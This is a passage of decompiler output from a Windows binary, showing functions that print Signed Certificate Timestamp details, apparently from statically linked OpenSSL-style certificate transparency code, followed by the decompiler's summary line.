    return 0xFFFFFFFFi64;
  }
  if ( (unsigned int)sub_1400C7160(a1, v11, v13) != 1 )
    return 0xFFFFFFFFi64;
  *a2 = &v11[v13];
  return a3 + v13 - v12;
}
// 1400C7CF3: variable 'v3' is possibly undefined

//----- (00000001400C7E20) ----------------------------------------------------
__int64 __fastcall sub_1400C7E20(unsigned int *a1, __int64 a2, unsigned int a3, const char *a4, unsigned int **a5)
{
  __int64 result; // rax
  int v9; // ebp
  unsigned int v10; // r14d
  unsigned int v11; // r15d
  __int64 v12; // rax
  __int64 v13; // rsi
  __int64 v14; // rdi
  int v15; // eax
  __int64 v16; // r9
  __int64 v17; // rax
  unsigned int v18; // eax
  char *v19; // rax
  int v20; // [rsp+30h] [rbp-48h]

  result = sub_1400296E0(a1);
  v9 = 0;
  v20 = result;
  if ( (int)result > 0 )
  {
    v10 = a3 + 4;
    v11 = a3 + 16;
    do
    {
      v12 = sub_140029880((__int64)a1, v9);
      v13 = 0i64;
      v14 = v12;
      if ( a5 )
        v13 = sub_1400C81F0(a5, *(const void **)(v12 + 24), *(_QWORD *)(v12 + 32));
      sub_14002A590(a2, "%*sSigned Certificate Timestamp:", a3, byte_1400D7DAE);
      sub_14002A590(a2, "\n%*sVersion   : ", v10, byte_1400D7DAE);
      if ( *(_DWORD *)v14 )
      {
        sub_14002A590(a2, "unknown\n%*s", v11, byte_1400D7DAE);
        v15 = *(_DWORD *)(v14 + 16);
        v16 = *(_QWORD *)(v14 + 8);
      }
      else
      {
        sub_14002A590(a2, "v1 (0x0)");
        if ( v13 )
        {
          v17 = sub_140021BD0(v13);
          sub_14002A590(a2, "\n%*sLog       : %s", v10, byte_1400D7DAE, v17);
        }
        sub_14002A590(a2, "\n%*sLog ID    : ", v10, byte_1400D7DAE);
        sub_140075B30(a2, v11, 16, *(_QWORD *)(v14 + 24), *(_DWORD *)(v14 + 32));
        sub_14002A590(a2, "\n%*sTimestamp : ", v10, byte_1400D7DAE);
        sub_1400C80D0(*(_QWORD *)(v14 + 40), a2);
        sub_14002A590(a2, "\n%*sExtensions: ", v10, byte_1400D7DAE);
        if ( *(_QWORD *)(v14 + 56) )
          sub_140075B30(a2, v11, 16, *(_QWORD *)(v14 + 48), *(_DWORD *)(v14 + 56));
        else
          sub_14002A590(a2, "none");
        sub_14002A590(a2, "\n%*sSignature : ", v10, byte_1400D7DAE);
        v18 = sub_1400C7080(v14);
        if ( v18 )
        {
          v19 = sub_14002C030(v18);
          sub_14002A590(a2, "%s", v19);
        }
        else
        {
          sub_14002A590(a2, "%02X%02X", *(unsigned __int8 *)(v14 + 64), *(unsigned __int8 *)(v14 + 65));
        }
        sub_14002A590(a2, "\n%*s            ", v10, byte_1400D7DAE);
        v15 = *(_DWORD *)(v14 + 80);
        v16 = *(_QWORD *)(v14 + 72);
      }
      sub_140075B30(a2, v11, 16, v16, v15);
      result = (unsigned int)sub_1400296E0(a1) - 1;
      if ( v9 < (int)result )
        result = sub_14002A590(a2, "%s", a4);
      ++v9;
    }
    while ( v9 < v20 );
  }
  return result;
}

//----- (00000001400C80D0) ----------------------------------------------------
void __fastcall sub_1400C80D0(unsigned __int64 a1, __int64 a2)
{
  __FrameHandler3::TryBlockMap *v4; // rbx
  const char *v5; // rax
  int v6; // [rsp+20h] [rbp-48h]
  char v7[24]; // [rsp+30h] [rbp-38h] BYREF

  v4 = (__FrameHandler3::TryBlockMap *)sub_14004FE00();
  if ( v4 )
  {
    sub_1400BD3F0(v4, 0i64, a1 / 0x5265C00, a1 % 0x5265C00 / 0x3E8);
    v5 = (const char *)__FrameHandler3::TryBlockMap::getpDC(v4);
    v6 = a1 % 0x3E8;
    sub_14002A5C0(v7, 0x14ui64, "%.14s.%03dZ", v5, v6);
    if ( (unsigned int)sub_1400BD7E0((__int64)v4, v7) )
      sub_1400BD5B0(a2, (__int64)v4);
    sub_14004FD70((__int64)v4);
  }
}

//----- (00000001400C81F0) ----------------------------------------------------
__int64 __fastcall sub_1400C81F0(unsigned int **a1, const void *a2, size_t a3)
{
  int v6; // ebx
  __int64 v7; // rsi

  v6 = 0;
  if ( (int)sub_1400296E0(*a1) <= 0 )
    return 0i64;
  while ( 1 )
  {
    v7 = sub_140029880((__int64)*a1, v6);
    if ( !memcmp((const void *)(v7 + 8), a2, a3) )
      break;
    if ( ++v6 >= (int)sub_1400296E0(*a1) )
      return 0i64;
  }
  return v7;
}

//----- (00000001400CE2C0) ----------------------------------------------------
char **sub_1400CE2C0()
{
  return off_1401269F0;
}
// 1401269F0: using guessed type char *off_1401269F0[44];

//----- (00000001400CE2C8) ----------------------------------------------------
const char *sub_1400CE2C8()
{
  return "+";
}

// nfuncs=3278 queued=2723 decompiled=2723 lumina nreq=0 worse=0 better=0
// ALL OK, 2723 function(s) have been successfully decompiled
